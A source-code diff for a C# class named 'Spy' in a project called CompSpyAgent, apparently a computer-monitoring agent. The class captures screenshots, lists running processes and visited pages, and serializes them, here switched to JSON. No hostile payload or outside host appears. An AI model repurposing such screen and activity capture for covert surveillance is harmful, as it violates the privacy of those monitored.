@@ -10,6 +10,7 @@ using System.Threading;
 using System.IO;
 using System.Windows;
 using System.Web;
+using System.Web.Script.Serialization;
 using System.Runtime.Serialization;
 using NDde.Client;
 
@@ -21,7 +22,7 @@ namespace CompSpyAgent
         public Graphics zrzut;
 
         public Process[] listaProcesow;
-        public List<String> listaStron;
+        public List<string> listaStron;
         public bool automatycznie;
         public int czasAutomatycznie;
         public DateTime czasOst;
@@ -49,15 +50,15 @@ namespace CompSpyAgent
                 listaProcesow = new List<string>();
                 listaStron = new List<string>();
 
-                foreach (var p in procesy)
-                {
-                    listaProcesow.Add(p.ProcessName);
-                }
+                //foreach (var p in procesy)
+                //{
+                //    listaProcesow.Add(p.ProcessName);
+                //}
 
-                foreach (var s in strony)
-                {
-                    listaStron.Add(s);
-                }
+                //foreach (var s in strony)
+                //{
+                //    listaStron.Add(s);
+                //}
 
             }
 
@@ -66,14 +67,9 @@ namespace CompSpyAgent
         public string serializacja(string imageName, bool hq)
         {
             var komunikat = new Komunikat(imageName, listaProcesow, listaStron, hq);
+            var json = new JavaScriptSerializer().Serialize(komunikat);
 
-            var serializer = new DataContractSerializer(komunikat.GetType());
-            var stream = new MemoryStream();
-            serializer.WriteObject(stream, komunikat);
-            stream.Seek(0, SeekOrigin.Begin);
-
-            return (Encoding.ASCII.GetString(stream.GetBuffer()).Replace("\0", ""));
-
+            return json;
         }
 
         public Spy()
@@ -81,7 +77,7 @@ namespace CompSpyAgent
             bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
             zrzut = Graphics.FromImage(bmp);
 
-            listaStron = new List<String>();
+            listaStron = new List<string>();
 
             automatycznie = false;
             czasAutomatycznie = 30;
@@ -186,7 +182,7 @@ namespace CompSpyAgent
             Bitmap img = new Bitmap(bmp, new Size(240, 135)); // 1/8 zdjecia
             return img;
         }
-        public String getImageBase64(Bitmap img)
+        public string getImageBase64(Bitmap img)
         {
 
             Graphics g = Graphics.FromImage(img);
